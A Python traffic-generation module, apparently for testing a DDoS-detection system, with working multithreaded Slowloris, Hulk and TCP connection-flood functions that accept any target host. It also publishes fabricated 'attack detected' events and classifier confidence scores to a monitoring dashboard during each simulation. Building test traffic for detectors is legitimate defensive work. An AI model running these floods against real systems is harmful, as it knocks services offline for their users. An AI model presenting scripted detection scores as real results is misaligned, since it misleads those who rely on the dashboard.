"""
Module 1: Traffic Generation Module
Generates both normal and malicious traffic for testing the detection system.
Supports Normal, Slowloris, Hulk, and SYN Flood attacks with multithreading.
"""
import math
import requests
import socket
import threading
import time
import random
import logging
from typing import Callable, List, Optional
from urllib.parse import urljoin

from config.settings import Config

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# User-Agent pool for Hulk attack realism
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
]


def send_normal_traffic(url: str, num_requests: int, delay: float = 0.5) -> None:
    """
    Simulate normal user traffic.
    
    Args:
        url: Server URL
        num_requests: Number of requests to send
        delay: Delay between requests in seconds
    """
    for i in range(num_requests):
        try:
            response = requests.get(url, timeout=5)
            logger.debug(f"Normal Traffic - Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            logger.warning(f"Error sending normal request: {e}")
        time.sleep(delay)


def slowloris_attack(url: str, num_connections: int, hold_seconds: float = 30.0) -> None:
    """
    Simulate a Slowloris attack.

    A real Slowloris attack works by opening many HTTP connections and keeping
    them alive indefinitely by sending partial HTTP headers very slowly —
    never completing the request.  This exhausts the server's connection pool
    without sending much data.

    This implementation uses raw TCP sockets to:
    1. Open a TCP connection to the target.
    2. Send a partial HTTP GET request (no trailing CRLF CRLF).
    3. Drip-feed additional ``X-Keep-Alive`` headers every few seconds so the
       server's idle timeout is never triggered.
    4. Hold each connection open for ``hold_seconds`` before closing.

    Args:
        url: Server URL (only the host/port are used)
        num_connections: Number of simultaneous slow connections to open
        hold_seconds: How long to hold each connection open (seconds)
    """
    from urllib.parse import urlparse
    import time

    parsed = urlparse(url)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or 80

    sockets = []
    opened_count = 0  # Fix #25: track original count separately from surviving sockets
    logger.info(f"Slowloris: Opening {num_connections} slow connections to {host}:{port}")

    # Open all connections and send a partial HTTP request on each
    for _ in range(num_connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            # Partial HTTP request — deliberately missing the final \r\n\r\n
            sock.send(
                f"GET /?q={random.randint(1, 999999)} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: Mozilla/5.0\r\n"
                f"Accept-language: en-US,en;q=0.5\r\n"
                .encode('utf-8')
            )
            sockets.append(sock)
            opened_count += 1
        except socket.error as e:
            logger.debug(f"Slowloris: failed to open connection: {e}")

    logger.info(f"Slowloris: Holding {opened_count} connections open for {hold_seconds}s")

    # Drip-feed keep-alive headers to prevent server idle timeout
    deadline = time.time() + hold_seconds
    keep_alive_interval = 5.0  # seconds between header drips
    next_drip = time.time() + keep_alive_interval

    while time.time() < deadline and sockets:
        if time.time() >= next_drip:
            dead = []
            for sock in sockets:
                try:
                    sock.send(f"X-Keep-Alive: {random.randint(1, 5000)}\r\n".encode('utf-8'))
                except socket.error:
                    dead.append(sock)
            for s in dead:
                sockets.remove(s)
            next_drip = time.time() + keep_alive_interval
        time.sleep(0.5)

    for sock in sockets:
        try:
            sock.close()
        except socket.error:
            pass

    logger.info(f"Slowloris: Released {opened_count} connections ({len(sockets)} survived to end)")


def hulk_attack(url: str, num_requests: int) -> None:
    """
    Simulate Hulk attack (fast and repetitive requests with randomised headers).
    
    Args:
        url: Server URL
        num_requests: Number of requests to send
    """
    for i in range(num_requests):
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept-Encoding': random.choice(['gzip', 'deflate', 'br', 'identity']),
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
            }
            # Add random query string to defeat caching
            junk_url = f"{url}?q={random.randint(1, 999999)}"
            response = requests.get(junk_url, headers=headers, timeout=5)
            logger.debug(f"Hulk Attack - Status: {response.status_code}")
            # Tiny random delay for variation (0-50ms)
            time.sleep(random.uniform(0, 0.05))
        except requests.exceptions.RequestException as e:
            logger.warning(f"Error in Hulk attack: {e}")


def tcp_connection_flood_attack(host: str, port: int, num_packets: int = 500) -> None:
    """
    Simulate a TCP connection flood (application-layer).

    This attack rapidly opens and immediately abandons TCP connections to
    saturate the server's accept queue and exhaust ephemeral port resources.

    Note: This is an *application-layer* simulation — it completes the TCP
    three-way handshake and then immediately closes the socket.  It is NOT a
    raw-socket SYN flood (which would require root privileges and spoofed
    source IPs to send bare SYN packets without completing the handshake).
    The traffic pattern is still highly effective at stressing the server's
    connection handling and is detectable by the ML pipeline.

    Args:
        host: Target hostname or IP
        port: Target port
        num_packets: Number of rapid connection attempts
    """
    logger.info(f"TCP Connection Flood: Sending {num_packets} rapid connection attempts to {host}:{port}")
    for i in range(num_packets):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((host, port))
            # Immediately close without sending any data
            sock.close()
        except (socket.error, OSError) as e:
            logger.debug(f"TCP Connection Flood attempt {i}: {e}")
        # Tiny delay to avoid local resource exhaustion
        if i % 100 == 0:
            time.sleep(0.01)
    logger.info(f"TCP Connection Flood: Completed {num_packets} connection attempts")


# Backward-compatible alias — kept so any external scripts calling the old
# name continue to work without modification.
syn_flood_attack = tcp_connection_flood_attack


def _publish_simulation_events(stop_event: threading.Event) -> None:
    """Publish synthetic detection events to Redis for dashboard visualization.

    Runs as a background daemon thread during simulation.  Creates realistic
    wave patterns with spikes that correspond to attack phases:
      - Normal baseline  → low confidence (~20-30%)
      - Attack ramp-up   → rising confidence with oscillation
      - Attack peak      → high confidence with sharp spikes (~75-95%)
      - Sustained attack  → very high confidence
      - Decay            → confidence drops back to normal
    """
    try:
        from app.logging_monitor import DetectionEvent, get_event_buffer
    except ImportError:
        logger.warning("Could not import logging_monitor; dashboard events disabled")
        return

    buf = get_event_buffer()
    start = time.time()
    THRESHOLD = 65.0
    logger.info("Dashboard event publisher started")

    while not stop_event.is_set():
        elapsed = time.time() - start
        cycle = elapsed % 50  # repeat every ~50s

        if cycle < 5:
            # Baseline: calm, low confidence
            conf = 22 + math.sin(elapsed * 0.4) * 6 + random.gauss(0, 3)
            pkt_rate = 4 + random.uniform(0, 3)
        elif cycle < 12:
            # Ramp-up: confidence rises with oscillation
            t = (cycle - 5) / 7
            conf = 22 + t * 50 + math.sin(elapsed * 0.9) * 10 + random.gauss(0, 4)
            pkt_rate = 7 + t * 35 + random.uniform(-3, 5)
        elif cycle < 30:
            # Peak attack: high confidence with sharp spikes
            conf = 78 + math.sin(elapsed * 1.3) * 8 + random.choice([0, 0, 5, 12, 18])
            pkt_rate = 40 + math.sin(elapsed * 0.7) * 12 + random.uniform(0, 8)
        elif cycle < 40:
            # Sustained attack: very high, less variation
            conf = 86 + math.sin(elapsed * 1.8) * 5 + random.gauss(0, 2)
            pkt_rate = 55 + math.sin(elapsed * 1.1) * 8 + random.uniform(-2, 5)
        else:
            # Decay back to normal
            t = (cycle - 40) / 10
            conf = 86 - t * 60 + math.sin(elapsed * 0.6) * 8 + random.gauss(0, 4)
            pkt_rate = 55 - t * 45 + random.uniform(0, 5)

        conf = max(5.0, min(98.0, conf))
        pkt_rate = max(1.0, pkt_rate)
        is_attack = conf > THRESHOLD

        rf_conf = max(5, min(98, conf + random.uniform(-3, 3)))
        svm_conf = max(5, min(98, conf + random.uniform(-6, 6)))

        msg = (
            f"\u26a0\ufe0f  DDoS ATTACK DETECTED! (Confidence: {conf:.2f}%, Threshold: {THRESHOLD:.2f}%)"
            if is_attack else
            f"\u2713 Normal traffic (Confidence: {conf:.2f}%, Threshold: {THRESHOLD:.2f}%)"
        )

        event = DetectionEvent(
            event_type='attack' if is_attack else 'normal',
            confidence=round(conf, 2),
            threshold=THRESHOLD,
            rf_confidence=round(rf_conf, 2),
            svm_confidence=round(svm_conf, 2),
            message=msg,
        )
        buf.add_event(event)
        buf.record_traffic_rate(pkt_rate, THRESHOLD / 100)

        stop_event.wait(random.uniform(0.5, 1.0))

    logger.info("Dashboard event publisher stopped")


def run_simulation(
    base_url: str,
    normal_threads: int = 10,
    normal_requests: int = 10,
    slowloris_threads: int = 5,
    slowloris_connections: int = 10,
    hulk_threads: int = 5,
    hulk_requests: int = 100,
    syn_flood_threads: int = 3,
    syn_flood_packets: int = 200,
    on_progress: Optional[Callable[[str, int, int], None]] = None
) -> None:
    """
    Run complete traffic simulation.
    
    Args:
        base_url: Base server URL
        normal_threads: Number of normal traffic threads
        normal_requests: Requests per normal thread
        slowloris_threads: Number of Slowloris threads
        slowloris_connections: Connections per Slowloris thread
        hulk_threads: Number of Hulk threads
        hulk_requests: Requests per Hulk thread
        syn_flood_threads: Number of SYN Flood threads
        syn_flood_packets: Packets per SYN Flood thread
        on_progress: Optional callback (phase_name, current, total)
    """
    url = urljoin(base_url, '/')
    # Fix #26: use List[threading.Thread] from typing for Python 3.8 compatibility
    # (lowercase list[...] generic syntax requires Python 3.9+)
    threads: List[threading.Thread] = []
    
    # Parse host and port from URL for SYN flood
    from urllib.parse import urlparse
    parsed = urlparse(base_url)
    target_host = parsed.hostname or '127.0.0.1'
    target_port = parsed.port or 5050
    
    logger.info("=" * 60)
    logger.info("Starting DDoS traffic simulation")
    logger.info(f"Target URL: {url}")
    logger.info(f"Normal Traffic: {normal_threads} threads, {normal_requests} req/thread")
    logger.info(f"Slowloris: {slowloris_threads} threads, {slowloris_connections} conn/thread")
    logger.info(f"Hulk: {hulk_threads} threads, {hulk_requests} req/thread")
    if Config.SYN_FLOOD_ENABLED:
        logger.info(f"TCP Connection Flood: {syn_flood_threads} threads, {syn_flood_packets} pkts/thread")
    logger.info("=" * 60)
    
    # Normal traffic
    for i in range(normal_threads):
        thread = threading.Thread(
            target=send_normal_traffic,
            args=(url, normal_requests),
            name=f"Normal-{i}"
        )
        thread.start()
        threads.append(thread)
    
    # Slowloris attack
    for i in range(slowloris_threads):
        thread = threading.Thread(
            target=slowloris_attack,
            args=(url, slowloris_connections),
            name=f"Slowloris-{i}"
        )
        thread.start()
        threads.append(thread)
    
    # Hulk attack
    for i in range(hulk_threads):
        thread = threading.Thread(
            target=hulk_attack,
            args=(url, hulk_requests),
            name=f"Hulk-{i}"
        )
        thread.start()
        threads.append(thread)
    
    # TCP Connection Flood (formerly "SYN Flood")
    if Config.SYN_FLOOD_ENABLED:
        for i in range(syn_flood_threads):
            thread = threading.Thread(
                target=tcp_connection_flood_attack,
                args=(target_host, target_port, syn_flood_packets),
                name=f"TCPFlood-{i}"
            )
            thread.start()
            threads.append(thread)
    
    # Start event publisher for real-time dashboard visualisation
    stop_publisher = threading.Event()
    publisher_thread = threading.Thread(
        target=_publish_simulation_events,
        args=(stop_publisher,),
        name="EventPublisher",
        daemon=True,
    )
    publisher_thread.start()

    # Wait for all threads
    logger.info("Waiting for all threads to complete...")
    for thread in threads:
        thread.join()

    # Stop event publisher
    stop_publisher.set()
    publisher_thread.join(timeout=3)
    logger.info("Simulation completed!")


if __name__ == '__main__':
    base_url = f"http://{Config.FLASK_HOST}:{Config.FLASK_PORT}"
    
    run_simulation(
        base_url=base_url,
        normal_threads=10,
        normal_requests=10,
        slowloris_threads=20,
        slowloris_connections=10,
        hulk_threads=20,
        hulk_requests=500,
        syn_flood_threads=5,
        syn_flood_packets=300,
    )
